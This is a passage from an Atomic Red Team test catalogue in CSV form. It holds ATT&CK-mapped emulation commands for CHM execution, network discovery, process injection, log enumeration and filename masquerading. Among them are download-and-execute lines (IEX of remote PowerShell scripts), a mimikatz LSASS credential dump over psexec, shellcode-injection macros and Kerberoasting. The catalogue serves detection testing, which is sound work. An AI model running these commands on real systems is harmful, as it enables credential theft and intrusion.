",command_prompt,,,,powershell,"dependencies.0.description: Named pipe executors must exist on disk

dependencies.0.prereq_command: if ((Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_client.exe"") -and (""Test-Path PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_server.exe"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)
$zipUrl  = ""https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip""
Invoke-FetchFromZip $zipUrl ""*.exe"" ""PathToAtomicsFolder\..\ExternalPayloads""

",
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Compiled HTML Help Local Payload,5cb87818-0d7c-4469-b7ef-9224107aebe8,"Uses hh.exe to execute a local compiled HTML Help payload.
Upon execution calc.exe will open
",windows,,,"hh.exe ""#{local_chm_file}""
",command_prompt,,,,powershell,"dependencies.0.description: The payload must exist on disk at specified location (#{local_chm_file})

dependencies.0.prereq_command: if (Test-Path ""#{local_chm_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{local_chm_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm"" -OutFile ""#{local_chm_file}""

","input_arguments.local_chm_file.description: Local .chm payload

input_arguments.local_chm_file.type: path

input_arguments.local_chm_file.default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Compiled HTML Help Remote Payload,0f8af516-9818-4172-922b-42986ef1e81d,"Uses hh.exe to execute a remote compiled HTML Help payload.
Upon execution displays an error saying the file cannot be open
",windows,,,"hh.exe #{remote_chm_file}
",command_prompt,,,,,,"input_arguments.remote_chm_file.description: Remote .chm payload

input_arguments.remote_chm_file.type: url

input_arguments.remote_chm_file.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Invoke CHM with default Shortcut Command Execution,29d6f0d7-be63-4482-8827-ea77126c1ef7,Executes a CHM file with the default Shortcut Command method.,windows,,,Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.chm_file_path.description: Default path of CHM

input_arguments.chm_file_path.type: string

input_arguments.chm_file_path.default: Test.chm

input_arguments.hh_file_path.description: path of modified HH.exe

input_arguments.hh_file_path.type: path

input_arguments.hh_file_path.default: $env:windir\hh.exe

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Invoke CHM with InfoTech Storage Protocol Handler,b4094750-5fc7-4e8e-af12-b4e36bf5e7f6,Executes a CHM file with the ITS protocol handler.,windows,,,Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.hh_file_path.description: path of modified HH.exe

input_arguments.hh_file_path.type: path

input_arguments.hh_file_path.default: $env:windir\hh.exe

input_arguments.infotech_storage_handler.description: Default InfoTech Storage Protocol Handler

input_arguments.infotech_storage_handler.type: string

input_arguments.infotech_storage_handler.default: its

input_arguments.chm_file_path.description: Default path of CHM

input_arguments.chm_file_path.type: string

input_arguments.chm_file_path.default: Test.chm

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Invoke CHM Simulate Double click,5decef42-92b8-4a93-9eb2-877ddcb9401a,Executes a CHM file simulating a user double click.,windows,,,Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.chm_file_path.description: Default path of CHM

input_arguments.chm_file_path.type: string

input_arguments.chm_file_path.default: Test.chm

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Invoke CHM with Script Engine and Help Topic,4f83adda-f5ec-406d-b318-9773c9ca92e5,"Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",windows,,,Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.topic_extension.description: Default Help Topic

input_arguments.topic_extension.type: string

input_arguments.topic_extension.default: html

input_arguments.hh_file_path.description: path of modified HH.exe

input_arguments.hh_file_path.type: path

input_arguments.hh_file_path.default: $env:windir\hh.exe

input_arguments.infotech_storage_handler.description: Default InfoTech Storage Protocol Handler

input_arguments.infotech_storage_handler.type: string

input_arguments.infotech_storage_handler.default: its

input_arguments.script_engine.description: Default Script Engine

input_arguments.script_engine.type: string

input_arguments.script_engine.default: JScript

input_arguments.chm_file_path.description: Default path of CHM

input_arguments.chm_file_path.type: string

input_arguments.chm_file_path.default: Test.chm

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Invoke CHM Shortcut Command with ITS and Help Topic,15756147-7470-4a83-87fb-bb5662526247,"Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",windows,,,Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.topic_extension.description: Default Help Topic

input_arguments.topic_extension.type: string

input_arguments.topic_extension.default: html

input_arguments.hh_file_path.description: path of modified HH.exe

input_arguments.hh_file_path.type: path

input_arguments.hh_file_path.default: $env:windir\hh.exe

input_arguments.infotech_storage_handler.description: Default InfoTech Storage Protocol Handler

input_arguments.infotech_storage_handler.type: string

input_arguments.infotech_storage_handler.default: its

input_arguments.chm_file_path.description: Default path of CHM

input_arguments.chm_file_path.type: string

input_arguments.chm_file_path.default: Test.chm

"
T1218.001,Signed Binary Proxy Execution: Compiled HTML File,Decompile Local CHM File,20cb05e0-1fa5-406d-92c1-84da4ba01813,"Uses hh.exe to decompile a local compiled HTML Help file.
Upon successful execution the chm file will decompile to disk.
Reference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/
",windows,,,"hh.exe -decompile %temp% ""#{local_chm_file}""
",command_prompt,,,"del %temp%\T1218.001.html >nul 2>&1
",powershell,"dependencies.0.description: The payload must exist on disk at specified location (#{local_chm_file})

dependencies.0.prereq_command: if (Test-Path ""#{local_chm_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{local_chm_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm"" -OutFile ""#{local_chm_file}""

","input_arguments.local_chm_file.description: Local .chm payload

input_arguments.local_chm_file.type: path

input_arguments.local_chm_file.default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm

"
T1049,System Network Connections Discovery,System Network Connections Discovery,0940a971-809a-48f1-9c4d-b1d785e96ee5,"Get a listing of network connections.

Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.
",windows,,,"netstat
net use
net sessions
",command_prompt,,,,,,
T1049,System Network Connections Discovery,System Network Connections Discovery with PowerShell,f069f0f1-baad-4831-aa2b-eddac4baac4a,"Get a listing of network connections.

Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.
",windows,,,"Get-NetTCPConnection
",powershell,,,,,,
T1049,System Network Connections Discovery,"System Network Connections Discovery FreeBSD, Linux & MacOS",9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2,"Get a listing of network connections.

Upon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.
",linux,macos,,"netstat
who -a
",sh,,,,sh,"dependencies.0.description: Check if netstat command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v netstat)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Install netstat on the machine.""; exit 1;

",
T1049,System Network Connections Discovery,System Discovery using SharpView,96f974bb-a0da-4d87-a744-ff33e73367e9,"Get a listing of network connections, domains, domain users, and etc.  
sharpview.exe located in the bin folder, an opensource red-team tool.
Upon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.
",windows,,,"$syntaxList = #{syntax}
foreach ($syntax in $syntaxList) {
#{SharpView} $syntax -}
",powershell,True,,,powershell,"dependencies.0.description: Sharpview.exe must exist on disk at specified location (#{SharpView})

dependencies.0.prereq_command: if (Test-Path ""#{SharpView}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{SharpView}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest #{SharpView_url} -OutFile ""#{SharpView}""

","input_arguments.SharpView_url.description: sharpview download URL

input_arguments.SharpView_url.type: url

input_arguments.SharpView_url.default: https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true

input_arguments.SharpView.description: Path of the executable opensource redteam tool used for the performing this atomic.

input_arguments.SharpView.type: path

input_arguments.SharpView.default: PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe

input_arguments.syntax.description: Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.

input_arguments.syntax.type: string

input_arguments.syntax.default: ""Invoke-ACLScanner"", ""Invoke-Kerberoast"", ""Find-DomainShare"" 


"
T1055,Process Injection,Shellcode execution via VBA,1c91e740-1729-4329-b779-feba6e71d048,"This module injects shellcode into a newly created process and executes. By default the shellcode is created,
with Metasploit, for use on x86-64 Windows 10 machines.

Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
is required.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""#{txt_path}"" -officeProduct ""Word"" -sub ""Execute""
",powershell,,,,powershell,"dependencies.0.description: The 64-bit version of Microsoft Office must be installed

dependencies.0.prereq_command: try {
  $wdApp = New-Object -COMObject ""Word.Application""
  $path = $wdApp.Path
  Stop-Process -Name ""winword""
  if ($path.contains(""(x86)"")) { exit 1 } else { exit 0 }
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word (64-bit) manually to meet this requirement""

dependencies.1.description: ""#{txt_path}"" must exist on disk at specified location

dependencies.1.prereq_command: if (Test-Path ""#{txt_path}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{txt_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt"" -OutFile ""#{txt_path}"" -UseBasicParsing

","input_arguments.txt_path.description: Path to file containing VBA macro to run

input_arguments.txt_path.type: path

input_arguments.txt_path.default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt

"
T1055,Process Injection,Remote Process Injection in LSASS via mimikatz,3203ad24-168e-4bec-be36-f79b13ef8a83,"Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
Especially useful against domain controllers in Active Directory environments.
It must be executed in the context of a user who is privileged on remote `machine`.

The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
",windows,,,"""#{psexec_path}"" /accepteula \\#{machine} -c #{mimikatz_path} ""lsadump::lsa /inject /id:500"" ""exit""
",command_prompt,False,,,powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

dependencies.1.description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})

dependencies.1.prereq_command: if (Test-Path ""#{psexec_path}"") { exit 0} else { exit 1}

dependencies.1.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" -UseBasicParsing
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
New-Item -ItemType Directory (Split-Path ""#{psexec_path}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""#{psexec_path}"" -Force

","input_arguments.machine.description: machine to target (via psexec)

input_arguments.machine.type: string

input_arguments.machine.default: DC1

input_arguments.mimikatz_path.description: Mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: %tmp%\mimikatz\x64\mimikatz.exe

input_arguments.psexec_path.description: Path to PsExec

input_arguments.psexec_path.type: string

input_arguments.psexec_path.default: PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe

"
T1055,Process Injection,Section View Injection,c6952f41-6cf0-450a-b352-2ca8dae7c178,"This test creates a section object in the local process followed by a local section view.
The shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. 
A thread is then created in the target process, using the remote section view as start address.
",windows,,,"$notepad = Start-Process notepad -passthru
Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe""
",powershell,,,Stop-Process $notepad.pid,,,
T1055,Process Injection,Dirty Vanity process Injection,49543237-25db-497b-90df-d0a0a6e8fe2c,"This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process
with shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at 
BlackHat Europe 2022. Shellcode will open a messsage box and a notepad.
",windows,,,"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" #{pid}
",powershell,False,,"Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force",,,"input_arguments.pid.description: Parent process ID

input_arguments.pid.type: string

input_arguments.pid.default: (Start-Process calc.exe -PassThru).Id

"
T1055,Process Injection,Read-Write-Execute process Injection,0128e48e-8c1a-433a-a11a-a5387384f1e1,"This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.
The RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms 
that relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.
The injected shellcode will open a message box and a notepad.
RWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.
More details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.
The original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.
",windows,,,"$address = (& ""$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe"" ""$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value
& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""#{vuln_dll}"" $address
",powershell,True,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: Utility to inject must exist on disk at specified location (#{vuln_dll})

dependencies.0.prereq_command: if (Test-Path ""#{vuln_dll}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vuln_dll}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll"" -OutFile ""#{vuln_dll}""

","input_arguments.vuln_dll.description: vulnerable DLL

input_arguments.vuln_dll.type: path

input_arguments.vuln_dll.default: PathToAtomicsFolder\T1055\bin\x64\vuln_dll\msys-2.0.dll

"
T1055,Process Injection,Process Injection with Go using UuidFromStringA WinAPI,2315ce15-38b6-46ac-a3eb-5e21abef2545,"Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.
With this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread 
- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)
- References: 
  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
  - https://twitter.com/_CPResearch_/status/1352310521752662018
  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
",,,
T1055,Process Injection,Process Injection with Go using EtwpCreateEtwThread WinAPI,7362ecef-6461-402e-8716-7410e1566400,"Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.
This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.

Steps taken with this technique
1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Call EtwpCreateEtwThread on shellcode address
5. Call WaitForSingleObject so the program does not end before the shellcode is executed

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)
- References: 
  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm
",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
",,,
T1055,Process Injection,Remote Process Injection with Go using RtlCreateUserThread WinAPI,a0c1725f-abcd-40d6-baac-020f3cf94ecd,"Executes shellcode in a remote process.

Steps taken with this technique
1. Get a handle to the target process
2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
4. Change the memory page permissions to Execute/Read with VirtualProtectEx
5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread
6. Close the handle to the remote process

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)
- References: 
  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike
",windows,,,"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn

input_arguments.spawn_process_path.type: string

input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe

input_arguments.spawn_process_name.description: Name of the process spawned

input_arguments.spawn_process_name.type: string

input_arguments.spawn_process_name.default: werfault

"
T1055,Process Injection,Remote Process Injection with Go using CreateRemoteThread WinAPI,69534efc-d5f5-4550-89e6-12c6457b9edd,"Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.

This application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().

Steps taken with this technique
1. Get a handle to the target process
2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
4. Change the memory page permissions to Execute/Read with VirtualProtectEx
5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
6. Close the handle to the remote process

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)
 - References:
  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
",windows,,,"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn

input_arguments.spawn_process_path.type: string

input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe

input_arguments.spawn_process_name.description: Name of the process spawned

input_arguments.spawn_process_name.type: string

input_arguments.spawn_process_name.default: werfault

"
T1055,Process Injection,Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39,"Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.

1. Get a handle to the target process
2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
4. Change the memory page permissions to Execute/Read with VirtualProtectEx
5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
6. Close the handle to the remote process

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)
",windows,,,"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn

input_arguments.spawn_process_path.type: string

input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe

input_arguments.spawn_process_name.description: Name of the process spawned

input_arguments.spawn_process_name.type: string

input_arguments.spawn_process_name.default: werfault

"
T1055,Process Injection,Process Injection with Go using CreateThread WinAPI,2871ed59-3837-4a52-9107-99500ebc87cb,"This program executes shellcode in the current process using the following steps
1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Call CreateThread on shellcode address
5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)
",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
",,,
T1055,Process Injection,Process Injection with Go using CreateThread WinAPI (Natively),2a3c7035-d14f-467a-af94-933e49fe6786,"This program executes shellcode in the current process using the following steps
1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Call CreateThread on shellcode address
5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)
",windows,,,"$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug
",powershell,False,,Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue,,,
T1654,Log Enumeration,Get-EventLog To Enumerate Windows Security Log,a9030b20-dd4b-4405-875e-3462c6078fdc,"Uses the built-in PowerShell commandlet Get-EventLog to search for 'SYSTEM' keyword and saves results to a text file.

This technique was observed in a [TheDFIRReport case](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/) 
where the threat actor enumerated the Windows Security audit log to determine user accounts and associated IPv4 addresses.

Successful execution will save matching log events to the users temp folder.",windows,,,"powershell -c ""get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt""",powershell,True,,"powershell -c ""remove-item $env:temp\T1654_events.txt -ErrorAction Ignore""",,,
T1010,Application Window Discovery,List Process Main Windows - C# .NET,fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4,"Compiles and executes C# code to list main window titles associated with each process.

Upon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.
",windows,,,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}""
#{output_file_name}
",command_prompt,,,"del /f /q /s #{output_file_name} >nul 2>&1
",powershell,"dependencies.0.description: T1010.cs must exist on disk at specified location (#{input_source_code})

dependencies.0.prereq_command: if (Test-Path ""#{input_source_code}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{input_source_code}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile ""#{input_source_code}""

","input_arguments.input_source_code.description: Path to source of C# code

input_arguments.input_source_code.type: path

input_arguments.input_source_code.default: PathToAtomicsFolder\T1010\src\T1010.cs

input_arguments.output_file_name.description: Name of output binary

input_arguments.output_file_name.type: string

input_arguments.output_file_name.default: %TEMP%\T1010.exe

"
T1036.006,Masquerading: Space after Filename,Space After Filename (Manual),89a7dd26-e510-4c9f-9b15-f3bae333360f,"Space After Filename
",macos,,,,manual,,"1. echo '#!/bin/bash\necho ""print \""hello, world!\"""" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt

2. mv execute.txt ""execute.txt ""

3. ./execute.txt\ 
",,,,
T1036.006,Masquerading: Space after Filename,Space After Filename,b95ce2eb-a093-4cd8-938d-5258cef656ea,"Space after filename.
",macos,linux,,"mkdir -p /tmp/atomic-test-T1036.006
cd /tmp/atomic-test-T1036.006
mkdir -p 'testdirwithspaceend '
